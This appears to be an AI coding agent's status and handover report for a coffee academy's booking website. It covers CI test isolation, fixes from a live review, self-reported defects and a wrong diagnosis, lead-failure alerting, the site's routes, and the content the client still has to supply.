  45 documents, the whole of `content/data.ts` plus both ₹1 test batches.
- **`tests/global-setup.ts` throws** unless the dataset is exactly `ci`. A hard failure rather than
  a skip, deliberately: skipping the reset would still let every test that follows write bookings
  into whichever dataset it was pointed at, and the writing is the damage, not the reset.
- **`pnpm test:e2e` sets `NEXT_PUBLIC_SANITY_DATASET=ci`** itself, so the safe path is the default
  one and nobody has to remember.
- **`.github/workflows/ci.yml` sets `ci` literally, not from a secret.** A dataset name is not a
  credential, and a literal cannot be quietly repointed at production by editing a secret. This is
  the one place I did not follow the instruction exactly, and the reason is in the next paragraph.

**Where this deviates from the instruction, and why.** The instruction was to put
`NEXT_PUBLIC_SANITY_DATASET=ci` in the GitHub secrets. `.github/workflows/nightly.yml` reads the
same secret for `scripts/stale-content.mjs`, which reports what the academy still has to fill in —
and that has to read `production`. Changing the secret would have quietly repointed the nightly
report at an empty seeded copy and made it report nothing missing. The secret is unchanged; `ci` is
pinned in the CI workflow where only the test job reads it.

**Proof.** Booking counts before: `production: 9`, `ci: 0`. The booking project run against `ci`:
27 passed. Counts after: **`production: 9` — unchanged — and `ci: 9`.** Pointed at production
deliberately, the run stops before the first test:

```
Error: [global-setup] Refusing to run against the "production" dataset. This suite creates
bookings, takes seats and deletes documents, so it runs only against "ci".
```

The two ₹1 test batches remain in `production` as well, and stay only until Ashrith has finished
his manual checks; `pnpm sanity:seed:test-batch -- --delete` removes them, and it must be run before
switching to live Razorpay keys. The `ci` copies stay.

---

### Live review pass — eight findings from the deployed site

One commit per finding, each with the content-editor run on the copy it touched.

#### 0. The course hero sent a buyer to a form

`/courses/latte-art` had an open, priced batch and its hero offered **"Reserve a seat", which went
to the enquiry form**. The only route to a checkout was the Book button in the batch table, most of
a page below. On a site whose entire job is enrolment, that is the most expensive thing a page can
do.

`courseCta` in `src/lib/batch.ts` is now the single rule the hero, the hub card, the home batch
rows and the final CTA all follow, ordered by the reader's certainty:

| State | Primary action |
|---|---|
| one open batch with a fee | **"Book this batch"** → `/book/<id>` |
| more than one | **"Choose a date"** → scrolls to the table rather than picking for them |
| a dated batch with no fee | "Ask about this batch", batch pre-filled |
| no dated batch | "Ask about the next batch"; the table's alert already renders |

Eleven unit tests written from the states, and an e2e test that clicks the hero on Latte Art and
reaches Razorpay's modal. "Reserve" and "Enrol" are gone from the interface; `/terms` keeps "Terms
of Use and Enrolment", which is the name of a legal document rather than a call to action.

**The content-editor caught a referent bug in the first version**: `bookable` did not require a
start date, so a priced, open, undated batch would have put "Book this batch" above a table reading
"Batch dates are being finalised" — a demonstrative with nothing to point at, and the alert
suppressed. It also caught the final CTA still saying "the fee and the batch dates are confirmed
with you before you pay" under a button that opens a checkout, where nobody confirms anything with
anyone. Both fixed, along with "Book a batch" (a batch is a cohort, not a unit of purchase) and an
unsourced "the academy sets dates a few weeks ahead" that had been sitting in two empty states.

#### 1. Authoring placeholders were public

`/for-cafes` said **"PLACEHOLDER. One sentence saying what the academy does for a cafe team"** under
its H1, and `/guides` answered each question in its card list with "PLACEHOLDER. One or two
sentences that answer the question in the title outright". The seed writes those deliberately — the
shape of the page is what it is for — and nothing stopped them rendering.

Filtered at the data layer in `src/lib/placeholder.ts`, so the rule holds for every field on every
template and for anything pasted in later that still carries the marker: a placeholder string
becomes null and the page's existing empty state fires; a page section that is still scaffolding is
dropped, and when nothing survives `/for-cafes` falls back to the hand-written copy it already
ships; a guide with no written body says it is being written and offers WhatsApp.

**Bylines are withheld** until `facts.md` records a signed article. "Written by Akanksha Gupta"
attributed a brief to a real person and "Checked by" claimed an internal review that has not
happened. `author` and `reviewedBy` leave the Article schema with them, because structured data
claiming an attribution the page does not show is worth distrusting. The markup is intact for the
day one is signed off.

#### 2. The academy has an SCA Authorised Trainer, and the site was not allowed to say so

`content/facts.md` now records the source: the SCA public trainer directory lists **Akanksha Gupta
as an SCA Trainer (AST), Karnataka**, for Introduction to Coffee, Barista Skills, Brewing, Sensory
Skills, Roasting, CVA for Cuppers and Q Grader, checked 5 September 2026. Currency of the listing
and which batches are assessed remain the academy's to confirm.

The forbidden-claims list is **narrowed, not dropped**: "SCA-certified courses" and "SCA Premier
Training Campus" stay forbidden, and AST stays forbidden for every trainer without a source. Her
credentials, her profile, the certifications comparison and the "Are your courses SCA certified?"
answer now say the academy has an AST on faculty and that assessed modules are available on batches
the academy confirms — and tell the reader to ask which ones, and what the SCA charges, before
booking. Course wording is unchanged.

#### 3. FAQ answers were already server-rendered

Checked by cold curl on `/faq` and all eight course pages: the FAQPage block is present on all nine
and every answer it claims was already in the server HTML outside `<script>`. **Nothing needed
fixing.** It is a test now, because the two halves can drift silently — an accordion that became
client-rendered would keep passing every schema assertion while a crawler saw questions and no
answers. The test compares each page against its own schema rather than a fixture.

#### 4. Seven TBC rows became one line

A course page carried seven cells that each said the same thing. A cell now appears when it has
something to say, and what is missing is covered once: **"Fee, dates and duration are confirmed on
WhatsApp before you pay"**. Same rule on the hub cards. The condition widened from four fields to
all seven, so a course with only a syllabus written no longer looks fully specified.

#### 5. Form copy, and the honeypot audited

"Two fields and you are done" counts the form for the reader instead of telling them what to send;
it is "Name and number are enough". "A trainer reads it" is "The academy reads it", matching the
same change already made on `/thank-you`, the guides empty state and the auto-reply.

**The honeypot needed no change** on either form: inside an `aria-hidden` wrapper, visually hidden,
`tabindex="-1"`, `autocomplete="off"`. All four are asserted now, because none is visible in review
and losing any one turns a bot trap into a trap for a real customer, whose submission is then
silently dropped.

#### 6. Three sentences that led with what is missing

The home page's final CTA, the `/courses` cafe card and the certifications page each spent their
words on what the academy has not published. The TBC states already carry that caveat wherever a
value is shown. The certifications one was the worst: it drew attention to the absence of an
employer list and a placement rate, both of which are on the forbidden-claims list, so the site was
apologising for not stating numbers it is not allowed to state.

The instruction called the home one "section 08"; the home page runs 01 to 07 and it is the last of
them.

#### 7. Contact is in the navigation, and the breakpoint moved to fit it

A coffee school is a place people come to, and the address, the hours and the map lived only in the
footer. Contact is the seventh item and **FAQ stays** — the instruction was to move it only if the
nav passed seven, and it is also still in the footer's wider list.

The constraint turned out not to be 390 but the desktop header. **Measured**: seven items widen the
nav row from 564px to 660px and the header to 1122px, so at the old 1080 breakpoint the header was
42px wider than its viewport — the defect this project already shipped at 1024 and fixed once.
`--breakpoint-nav` is **1128**, that measurement on the 8px grid. The cost is a 48px band, 1080 to
1127, that gets the mobile sheet instead of the nav row. Verified at 360, 390, 768, 1024, 1080,
1127, 1128, 1200 and 1280: no overflow anywhere, and the row switches on exactly where the token
says.

---

### What the reviewers caught, including three defects I introduced

The content-editor and design-reviewer ran on every route these commits touched. Their findings
are worth recording separately, because half of them were mine.

Gate: typecheck, lint and build clean; **1797 e2e tests passing, 0 failing**, 260 skipped by
design, against the `ci` dataset.

Verified on the deployment afterwards, not only locally: every touched route 200; **zero
placeholder strings on `/for-cafes`, `/guides`, a guide and `/lp`**; the AST wording live on
`/faq`; all seven nav labels including Contact in the served HTML; `/lp/example-campaign` titled
"Latte Art" rather than its own brief; and the three standing scripts clean — no overflow at 360,
390, 768, 1024 or 1280, no forbidden colour pair, every standalone target at least 44px.

**Introduced by the hero-CTA commit and fixed before it shipped:**

- `courseCta` did not require a batch to have a **date** before calling it bookable. `BatchTable`
  only renders dated rows, so a priced, open, undated batch would have printed "Book this batch"
  above a table reading "Batch dates are being finalised" — a demonstrative with nothing to point
  at, and the batch alert suppressed.
- The final CTA still said "the fee incl. GST and the batch dates are confirmed with you before you
  pay" under a button that opens a checkout, where nothing is confirmed with anyone.
- "Book a batch" was the wrong verb twice over: a batch is a cohort rather than a unit of purchase,
  and the click scrolls rather than books. It is "Choose a date".

**Introduced by the card commit and fixed after review:**

- The card's book band **escaped its grid row** — `h-full` on the body link with the band as its
  sibling meant 44px of overhang at 1280 and a 12px collision with the next row's photo at 768.
- `group` on the article meant **hovering the band underlined the card title**: the card signalling
  "open the course page" while the pointer was on a link to a checkout.
- The band was 12px uppercase red — the quietest thing on the card, under design.md's 16px floor
  for red text, and the only route to a checkout on the hub.

**Introduced by the placeholder commit and fixed after review:**

- Filtering a guide body block by block left the four question headings standing with every answer
  removed: a page that looks like it answers four questions and answers none, which is worse than
  the honest panel. A body now survives only if some prose does.
- A stripped excerpt rendered a phantom paragraph, an **empty meta description** and an empty
  description in the Article schema.
- The guides hub still told the reader guides are "checked by another one of them before it goes
  up" — the exact claim the bylines had just been withheld for.

**Found by review, not introduced here, and worth more than any of the above:**

- **The page asked for money without naming an amount.** `FeeBlock`, the sticky bar and the
  `/courses` fee panel all read `course.feeInclGst`, while every CTA read `feeForInstance`, which
  honours a batch's `priceOverride`. `/courses/latte-art` therefore printed "Fee TBC — the academy
  confirms the fee for each batch" on a page whose hero, sticky bar and batch table all said "Book
  this batch". The fee now comes from the batch the button points at. The bar had the same split on
  dates: it showed the soonest batch while booking the soonest *bookable* one, so on a course whose
  next batch is sold out it described one batch and charged for another.
- **The batch table clipped its own primary action at 390.** 376px of table inside a 350px
  scroller, so Book and Waitlist were cut mid-word with no scroll affordance — on the 64% of this
  audience that is on a phone. Stacked rows below md now, mirroring the pattern `/courses` already
  used for the fee table.

**Five commits went to a detached HEAD.** A bisect left the repo off `main`, so the honeypot fix,
the `/lp` fix and two STATUS updates were committed to no branch; `git push -q origin main`
reported success each time because local `main` had not moved either, and CI kept re-testing the
stale tip whose failures I then read as current.

**Fixed by `.githooks/pre-push`**, which refuses a push from a detached HEAD or from any branch but
main (`git config core.hooksPath .githooks` once per clone), and by a rule in CLAUDE.md: never
`git push -q`, and print `git rev-parse --short origin/main` after every push to confirm the remote
actually moved. The deployment was never affected — `vercel deploy` uploads the working tree — but
for an hour the repository was behind the live site, which is exactly backwards.

**A false diagnosis, recorded because the trap is easy to fall into again.**

Three suite runs failed on `/guides/*` and `/lp/example-campaign` with 404s that vanished when the
same routes were run on their own. I diagnosed that as Sanity's CDN serving a stale, empty view of
`guide` at build time — `generateStaticParams` decides which pages exist, so a stale read renders
no guide rather than an old one — and changed `readClient` to bypass the CDN.

**That diagnosis was wrong.** A `pnpm start` server was still bound to port 3100 from an earlier
build, so every "fresh build" being curled was answered by a stale process that predated the
seeding. A bisect run on top of that appeared to show `/lp` broken at a commit which touched no
page code, because it was measuring the same stale server three times. On a free port the route
returns 200 from the current code, and the full suite is green with the original client. The
`useCdn` change is reverted: a change whose justification has collapsed is worse than the marginal
argument for it.

The mechanism that hid this is worth knowing: `playwright.config.ts` sets
`reuseExistingServer: !process.env.CI`, so a stale local server is silently reused by the suite
too. **`lsof -ti:3000 -ti:3100 | xargs kill -9` before trusting a local run**, and treat "passes
alone, fails in the suite" as a question about which server answered rather than about the code.

**Open, and deliberately not done in this pass:**

- `/for-cafes` has no dark section and runs its whole length at the compressed `section-y-sm`
  rhythm rather than design.md's 64/128. It is also the only route with no photograph slot at all,
  so it reads as a text document.
- The consent checkbox is 24px. That clears WCAG 2.5.8 and fails this project's stricter 44px rule.
  It is shared by `/enquire`, `/contact` and `/for-cafes`.
- The footer's four `h2`s are 12px, in the same outline as the page's 28/40px `h2`s.
- A batch's waitlist link passes `?batch=5%20Sept%202027` — a formatted date where `courseCta`
  passes an instance id. One of the two is wrong.

---

### A dropped lead no longer looks like success, and CI got its speed back

**Every failure on the enquiry routes still hands the visitor to WhatsApp**, which is right for
them: a form that throws mid-enquiry loses the person outright, and the conversation can still
happen. What was wrong is that it looked identical to a lead that arrived — same 200, same shape,
nothing to reconcile against. The academy could have lost a week of leads and seen a quiet week.

Each failure now leaves three traces, and **none of them carries the form's contents**. The name,
the number, the email and the message are the reason to care and the reason not to copy them into a
log or an alert inbox; what travels is the lead's shape — its type, its course, whether it had an
email — which is enough to tell a bot storm from a broken integration.

| Stage | What the visitor sees | What the academy gets |
|---|---|---|
| Turnstile refused the challenge | the WhatsApp handoff | error log + alert: usually a bot, worth watching if several arrive together |
| Sanity did not store it | the WhatsApp handoff | error log + alert: **the lead is in no list anywhere** |
| Stored, but the email did not send | the ordinary success state | error log + alert + `deliveryFailed` on the document; the lead is safe |

**The alert is capped at six an hour per instance.** A failed challenge is the ordinary shape of a
bot, and alerting on each one would fill the inbox and train the academy to ignore the alert that
matters. The log is never capped.

`scripts/lead-failures.mjs` counts them nightly into the job summary, and emails the alert inbox
**only when the count is above zero** — a nightly "0 leads were lost" message is one people filter,
and the one that says 4 gets filtered with it. It writes to no file and commits nothing. It is
explicit about what it cannot count: an enquiry that never reached Sanity has no document to flag,
so those exist only in the platform log, and it prints the command to look.

The alert half needs `RESEND_API_KEY` and `LEAD_TO_EMAIL` as repository secrets, which this
repository deliberately does not have — CI must never mail the academy from a test run. Until they
are added the count still reaches the job summary and the script says what it could not do.

`tests/booking/enquiry-browser.spec.ts` fills the real form, presses the real button and then asks
Sanity whether the lead is there. The existing pipeline tests post to the route directly, which is
right for testing its branches and blind to everything the browser does on the way — a missing site
key stopped every submission on the deployed site while they stayed green.

`/api/health` answers whether the app can reach its content, lists what is switched on and names any
integration configured on one side only. Booleans and names, never values. 503 when the content is
unreachable, because a site that cannot read its own courses is down whatever its status line says.

#### The CI split

| Trigger | Job | Cap |
|---|---|---|
| push, PR | `static`, `secrets`, `audit`, **`smoke`** — build, 10 chromium checks, `check-overflow`, `check-csp` | 12 min |
| nightly, or `gh workflow run nightly.yml` | **`full-suite`** — the whole matrix on chromium, webkit and the four device projects, then all four standing scripts | 40 min |

The full matrix is about 2069 tests and takes half an hour on a two-core runner. Half an hour before
every commit is how a gate stops being a gate: people push and stop watching, and a red run reads as
"the slow one is unhappy again". The smoke set is the shortest that would have caught what has
actually broken here — a checkout nobody could reach, a bot check nobody could pass, a page
rendering its author's brief, a robots file that cancelled out its own noindex. **Run the full suite
before anything that matters**: a deploy, a release, a change to the payment or lead paths.

#### Also

- **The sticky bar takes its primary action from the route.** It fell through to "Courses" on every
  page that is not a course, including `/for-cafes`, whose whole job is a proposal, and
  `/workshops`, whose job is the batch alert. Declared in `src/lib/nav.ts`; course pages still work
  theirs out from whether a batch can be paid for; anything unlisted keeps the Courses default.
- **`/for-cafes` has an image slot**, `for-cafes-team`, added to `docs/images-manifest.md`. It was
  the only route with none, so it read as a text document and the client had nothing to fill.

---

## Where this stands, and what to do next

**All ten phases are complete.** The design gate is met: the design-reviewer scores
**8.5 / 8.0 / 8.5 / 8.0** on `/`, `/courses`, a course page and `/about`, against a target of 8,
with no critical or high finding left open. The `qa-runner` pass is green on every command. The
site is deployed and verified on the deployment itself. The work is on `main`.

### The draft is deployed and nothing is outstanding

`https://espresso-academy-india.vercel.app` serves the code at `4c6555a`; the commits after it
change CI and documentation and nothing the browser receives. `docs/CLIENT-REVIEW.md` carries that
same URL and needs no edit, so the link can go to the client as it stands.

To redeploy after any further change, from the repo root:

```
pnpm build && pnpm test:e2e                                    # confirm green first
npx vercel deploy --prod --yes                                 # the public alias
node scripts/check-overflow.mjs https://espresso-academy-india.vercel.app
node scripts/preview-screens.mjs https://espresso-academy-india.vercel.app
```

Run the three standing scripts against the deployment, not only against localhost. A per-deployment
preview URL is not a substitute: those 302 to a Vercel login on this team, which is why the alias
is the thing to share.

### What the client's answers unblock

Nothing in the "Needs client" table below blocks a build or a deploy; every row already has a
visible TBC state. The two that change the most on arrival are the photography (item 15), which
turns roughly a fifth of `/about` and every card frame from placeholder into content, and the fees
and dates (items 1 and 4), which switch the `/courses` fee table, the spec strips and the sticky
bar's context row back on by themselves.

### What is verified as of this commit

Run against a local production build (`pnpm build && pnpm start`):

| Check | Result |
|---|---|
| `pnpm typecheck` | clean |
| `pnpm lint` | clean |
| `pnpm build` | clean, 43 routes generated |
| `pnpm test:e2e` | **932 passing**, 0 failing, across chromium, webkit, Pixel 7, iPhone 14, iPad Mini, Laptop 1024 |
| `node scripts/check-overflow.mjs` | no overflow on any route at 360, 390, 768, 1024 or 1280 |
| `node scripts/check-brand-contrast.mjs` | no forbidden colour pair on any route |
| `node scripts/check-target-size.mjs` | every standalone tap target at least 44px |
| design-reviewer | 8.5 / 8.0 / 8.5 / 8.0, gate met on all four pages |
| `qa-runner` (Phase 9 step 1) | every command passes; Lighthouse mobile Performance 92 to 94, Accessibility 100, Best Practices 100, SEO 100, CLS 0 |

Separately verified by hand during the review rounds: no document overflow on any of the 26 routes
at 320, 360 or 375; the header carries a visible Enquire pill at every width from 768 up; the three
trainer cards end level at 768, 1024 and 1280; `/courses` renders zero TBC pills while no fee or
duration exists.

### Deliberately not done, and why

- **The `/about` gallery is still six placeholder frames**, which is about a fifth of that page's
  height. The master prompt specifies "a gallery grid of six photo slots", so the count stays until
  the photography lands rather than being trimmed to look better while empty.
- **The stacked hero frame is tall between 1024 and 1079** (a 3:2 placeholder across a full-width
  column). With a real photograph that is a legitimate full-bleed hero, which is what design.md
  asks for, so it is left alone.
- **The footer still uses the supplied stacked lockup.** A review round argued its wordmark reads
  as a smudge at 80px and that the header's mark-plus-Montserrat pairing should be used there too.
  That is the same brand decision already logged as client item 18a, so it is not taken unilaterally.
- **`--color-green` is still used for the two form success confirmations.** It was removed from the
  decorative "Who this is for" ticks, where an unconfirmed hex was acting as a persistent brand
  accent on every course page. A success tick is transient and semantic, so it stays until item 20
  is answered.

### Nothing is half-finished in the code

Every phase committed is complete in itself. There is no partial refactor, no stubbed function and
no TODO that blocks a build. The `TODO(client)` comments throughout `src/` are deliberate markers
for content the academy has not sent; each one has a visible TBC state on the page and a row in the
"Needs client" table above.

---

## Every route built

| Route | Indexed | Sticky bar | Notes |
|---|---|---|---|
| `/` | yes | yes | Home. The only place the red gradient is used on text. |
| `/courses` | yes | yes | Server-rendered `?level=` and `?area=` filters; canonical always `/courses`. |
| `/courses/italian-barista-certificate-junior` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/italian-barista-certificate-advanced` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/sca-barista-skills-foundation` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/sca-barista-skills-intermediate` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/sca-barista-skills-professional` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/latte-art` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/brewing` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/courses/roasting-and-cupping` | yes | yes | Course page: spec strip, fit, syllabus, batches, fee, ladder, FAQ, related. Own OG card. |
| `/calendar` | yes | yes | Currently the dates-being-finalised state with a per-course batch alert. |
| `/certifications` | yes | yes | IBC and SCA compared, plus the honesty clause. |
| `/certifications/italian-barista-certificate` | yes | yes | Question-shaped headings, answer-first. Article JSON-LD. |
| `/certifications/sca-coffee-skills-program` | yes | yes | Question-shaped headings, answer-first. Article JSON-LD. |
| `/trainers` | yes | yes | Three profiles. |
| `/trainers/akanksha-gupta` | yes | yes | Person + hasCredential JSON-LD. Role and philosophy are TBC. |
| `/trainers/sowmya-r` | yes | yes | Person + hasCredential JSON-LD. Role and philosophy are TBC. |
| `/trainers/nirupam-ranjan` | yes | yes | Person + hasCredential JSON-LD. Role and philosophy are TBC. |
| `/about` | yes | yes | Florence 2007, Bengaluru 2023, method, campus, gallery, team, honesty. |
| `/faq` | yes | yes | Every question grouped by category, FAQPage JSON-LD. |
| `/contact` | yes | yes | Switches the form to the cafe variant on `?topic=cafe`. |
| `/enquire` | yes | no | The conversion page. No section navigation, no sticky bar. |
| `/thank-you` | **no** | no | Post-submit. noindex. |
| `/privacy` | yes | yes | Placeholder copy, `data-placeholder="true"`. |
| `/terms` | yes | yes | Placeholder copy, `data-placeholder="true"`. |
| `/refund-policy` | yes | yes | Placeholder copy, `data-placeholder="true"`. |
| `/dev/components` | **no** | no | Internal component gallery, every state of every component. |

Non-page routes: `/api/enquiry` (POST only), `/sitemap.xml`, `/robots.txt`, `/llms.txt`,
`/opengraph-image`, `/courses/[slug]/opengraph-image`, `/icon.png`, `/apple-icon.png`.

**26 indexable routes**, plus the non-indexed gallery.

---

## TBC for client

Everything below renders as a visible "TBC" state on the site today. Send the value and it
appears; no code change is needed.

### Needs client

| # | Item | Where it shows | Source of the gap |
|---|---|---|---|
| 1 | Fee incl. GST for all 8 courses | Course cards, spec strips, fee blocks, fee table on `/courses` | `courses[].feeInclGst` is `null` |
| 2 | Duration (days and/or hours) for all 8 courses | Spec strips, course cards | `courses[].durationDays` / `durationHours` |
| 3 | Delivery format for all 8 courses | Spec strips | `courses[].format` |
| 4 | Batch dates | `/calendar`, batch tables, "next batch" strips | every `instances[]` entry is a `tbc` instance |
| 5 | Seat counts per batch | Batch tables | `instances[].seatsAvailable` |
| 6 | Syllabus / module list per course | "What you will learn" | `courses[].modules` is `null` |
| 7 | What the fee includes | "What you get" | `courses[].includes` is `null` |
| 8 | EMI availability | Fee block | `courses[].emiAvailable` |
| 9 | Which trainer teaches which course | Course pages, trainer profiles | `courses[].trainers` is empty for 7 of 8 |
| 10 | WhatsApp number | Every WhatsApp button, sticky bar | `siteSettings.whatsappConfirmed: false`; currently using +91 94481 06100 |
| 11 | Public email address | Footer, `/contact` | `siteSettings.email` is `null` |
| 12 | Opening hours | Footer, `/contact` | `siteSettings.hours` is `null` |
| 13 | Reply promise wording | `/enquire` trust line | `siteSettings.replyPromise` is `null` |
| 14 | Trainer roles and philosophy quotes | Trainer cards and profiles | `trainers[].role` / `philosophy` are `null` |
| 15 | Photos for every slot in `docs/images-manifest.md` | Hero, course cards, trainer profiles, about gallery, contact | no files in `public/images/` |
| 16 | Testimonials with written permission | Student stories section | `stories` is empty and stays empty until then |
| 17 | Legal copy: privacy, terms, refund policy | `/privacy`, `/terms`, `/refund-policy` | placeholder text marked `data-placeholder="true"` |
| 18 | Logo as SVG, and ideally a **horizontal lockup** | Header, footer, OG images | only raster renders in `public/logo/`, and the only lockup is stacked |
| 18a | **Sign-off on the header composition.** The supplied stacked lockup's wordmark renders about 5.6px tall at header size, so the header pairs the supplied standalone mark with the academy name set in Montserrat 500. The artwork is untouched, but composing a lockup is a brand decision. A horizontal lockup makes this moot. | Header, every page | design.md assumes a horizontal lockup that was not supplied |
| 19 | Gotham web licence | Site-wide type | Montserrat is the interim substitute |
| 20 | Correct "Forest Green" hex | Seat-availability state | brochure prints `#89392B`, which is a brown |
| 21 | Correct plot number and map pin | `/contact`, footer, JSON-LD | site says Plot No. 72, brochure says 9; map pin points at "Siddarth Plaza" |
| 22 | SCA campus status and trainer AST status | Certification pages, course copy | until confirmed the site says "training aligned to the SCA Coffee Skills Program" |
| 23 | Written permission for the "Official Partner" wording | Header, footer, about, home | `facts.md` allows the wording provisionally |
| 24 | Which brochure claims are current | About, home | "17 branches", "Berry Co", "Coorg planters" are all unverified and unused |
| 25 | Legal entity name and tagline | Footer legal row | `siteSettings.legalName` / `tagline` are `null` |

`node scripts/stale-content.mjs` prints this list live from Sanity, so it cannot go stale. As of
the build-2 deploy it reports: 8 courses with no fee, 8 with no duration, 7 with no trainer, 8 with
fewer than four questions, 8 with no photograph, 8 batches with no date, 3 trainers with no role or
photograph, and all six settings fields missing.

### Needs developer

Everything on the build-1 list is now built: the Sanity migration, Resend, the Google Sheets mirror,
GTM / GA4 behind consent, Turnstile, Razorpay checkout per batch, and the guides. What is left needs
an account or a decision from the academy first, not development:

- **Resend sending domain.** Verify the academy's domain, then set `RESEND_FROM_EMAIL`. Until then
  mail sends from `onboarding@resend.dev`, which reaches an inbox but does not say Espresso Academy
  in the sender line.
- **Google Sheets mirror.** Needs a service account and a shared sheet. Optional: without it a lead
  still reaches Sanity and the inbox.
- **Meta Pixel and Conversions API.** Both are wired and share an `event_id`; both are dormant until
  the two variables are set.
- **Cal.com**, if the academy wants cafe enquiries to book a call.
- **The remaining six SEO guides.** Two are seeded as working templates with every paragraph marked
  PLACEHOLDER; the shape is what matters and it is in place.

---

## Decisions taken

| Decision | Why |
|---|---|
| Scaffolded into a scratch directory and copied the generated files in | `create-next-app` refuses a non-empty directory and the kit files had to survive untouched. |
| shadcn primitives are used for behaviour only; every brand button, card and form control is a separate component | The generated `Button` is 32px tall by default, well under the 44/48px target rule, and its variants speak shadcn's semantic palette rather than the brand's. |
| The `dark` variant is bound to an explicit `.dark` class that the site never sets | shadcn primitives ship `dark:` classes; left on the OS preference they would fire on a viewer's dark-mode setting and break the white-dominant brand. |
| Fonts go through `next/font/local` rather than a plain `@font-face` | Still self-hosted and still Montserrat + Bebas Neue, but Next fingerprints the files, emits the preload link and generates a metric-matched fallback, which protects the CLS budget. |
| Desktop type sizes added as `--text-*-lg` tokens | `design/tokens.css` states the desktop scale in a trailing comment rather than as tokens; promoting it keeps the scale in one place instead of scattering `md:` sizes through components. |
| `.env.local` and the `.DS_Store` files were removed from git tracking | `.claude/rules/git.md` forbids committing `.env.local`; the files held no secrets, only the empty template. `.env.example` is force-included so it stays committed. |
| Node 24 used rather than the Node 22 in `.node-version` | That is what is installed on the build machine and Next 16 supports it. |
| **The header uses the standalone mark plus the academy name set in Montserrat, not the supplied lockup. Needs client sign-off.** | design.md assumes a horizontal lockup exists. The only supplied lockup is stacked and roughly square: at a header-sized 48px its wordmark renders about 5.6px tall and "INDIA" about 3.2px, so the academy's name is illegible on mobile and desktop alike. Reaching a readable 9px wordmark would need a 78px logo and a 95px header. The supplied artwork is untouched (no crop, recolour or rotation) and the full stacked lockup still runs in the footer, where 80px gives the wordmark room. This composes a new lockup, which is a brand decision, so it is flagged here rather than shipped quietly. Sending the SVG (item 18) or a horizontal lockup resolves it. |
| The enquiry form uses a native `<select>` rather than the shadcn/Base UI `Select` | The form is the site's only conversion path on a 64%-mobile audience. A native select opens the OS picker, needs no JavaScript, and cannot break. The shadcn `Select` is installed and demonstrated in the component gallery. |
| Course filters are links, not buttons | Every filtered view is rendered on the server, so it works with JavaScript off, reads correctly without ARIA, never flashes an unfiltered list, and canonicalises back to `/courses`. |
| `@fontsource/montserrat` added as a dependency | The Open Graph image renderer needs WOFF, and the variable package ships only WOFF2. Used at build time only; nothing extra reaches the browser. |
| The photo placeholder's mark sits at 10% opacity on light grounds, not the 20% the brief specifies | 20% holds on the black ground, but on white-3 the red artwork reads as a distinct pink, and with a placeholder in every course card and trainer card it became the only pastel note on the page. The intent, a faint watermark, is unchanged. |
| Scroll-triggered reveals are not implemented, though design.md permits them | They need an IntersectionObserver, which is another client component on a site already over its JavaScript budget, in exchange for decoration. The motion that ships is CSS only and all of it responds to something the reader started: the arrow on a card, the underline on a link, the sheet, the accordion, the sticky bar. All of it stops under `prefers-reduced-motion`. |
| The mobile sticky bar waits for the consent choice before appearing | Both are fixed to the bottom of the viewport. The bar carries WhatsApp, Call and Reserve, so it holds back rather than being covered. The banner is dismissed in one tap and never returns. |
| The course card collapses its four TBC pills into one line while every value is unknown | Four grey pills per card across eight cards made the unknowns the loudest thing on the hub. The full spec row returns the moment any value lands, with no code change. |
| The `open` level is labelled "Open level", not "All levels" | Two chips in the level filter both read "All levels": the reset and the level itself. Renaming the level removes the collision at its root, and the site already said "open-level courses" elsewhere. |
| **The twelve-column layout grids switch on at `lg` (1024), and the header and both heroes at a `--breakpoint-nav` token of 1080px** | Twelve columns at 768 gave 200px text columns, a five-column 91px footer and a hero aside floating beside a column twice its height, and it was the root cause of the level-ladder badges rendering outside their cards. The header needs 1064px for the brand, six nav items and two actions inside design.md's 32px gutters, so at `lg` exactly it was 2px wider than the viewport. 1080 is measured, and it is a token in `globals.css` because rule 3 forbids an inline arbitrary value. |
| The certificate cell on a course page is labelled from the certification's `status`, not a fixed "Certificate" | It read `Certificate: SCA`, and `facts.md` line 45 lists "SCA-certified courses" among the phrases the site must never use: the SCA issues certification itself, on an assessed module, and whether a batch is assessed is unconfirmed. `status: "confirmed"` gives "Certificate" (the IBC genuinely is issued), `"wording-pending"` gives "Programme". No slug is hard-coded and no new content field was invented. |
| `/courses` renders an empty state instead of the fee table while every fee and duration is null | design.md's states rule is "empty state copy + WhatsApp", and this was the one place the site owed one and did not give it: eight rows of sixteen identical TBC pills, restating the course titles and level badges the card grid above already showed, to prove the point the section description makes in one sentence. The table returns unchanged as soon as one value lands. |
| The course-page title drops seo.md's `{Course} \| {Level} Barista Course in Bengaluru` pattern | That pattern runs to 73 characters for most of these course names, well past the 50 to 60 ceiling in the same rule. The ceiling wins, because it is what a search result actually displays; the longest variant of the pattern that fits is used. |

---

## Known limitations

### Carried into launch from build 2

- **The rate limiter is per-instance.** Serverless functions do not share memory, so the real limit
  is roughly the configured number times the number of running instances. Deliberate at this
  traffic: the honeypot, the two-second floor and Turnstile are what actually stop a bot, and a
  per-IP number tight enough to interest an attacker also turns away a student behind Indian
  carrier CGNAT. A shared store is one file away if it is ever needed.
- **LCP on the deployment is not one number.** The warm nightly of 7 September has every route
  between 1.8s and 2.4s, inside the ≤2.5s budget; this workstation measured the same commit the
  same morning at 2.4s to 3.0s; the cold nightlies before the warm-up fix reached 3.2s. Every one
  of those is Lighthouse's simulated throttling on a text LCP that re-registers when Montserrat
  arrives, so the figure tracks the machine more than the site. Performance is ≥95 on every route
  on every reading, so the score target is met on all of them. The lever that would end the
  argument is the client's photography: an image LCP can be preloaded and served as AVIF.
- **Student confirmation emails are not delivered while `RESEND_FROM_EMAIL` is unset.** This is
  the only known limitation that costs a paying customer something today. With no verified domain
  the sender is `onboarding@resend.dev`, and Resend refuses that sender for every recipient except
  the account owner, with a 403 and no delivery record. The booking still completes: the seat is
  taken, the payment is captured, the confirmation page renders with the calendar file, and the
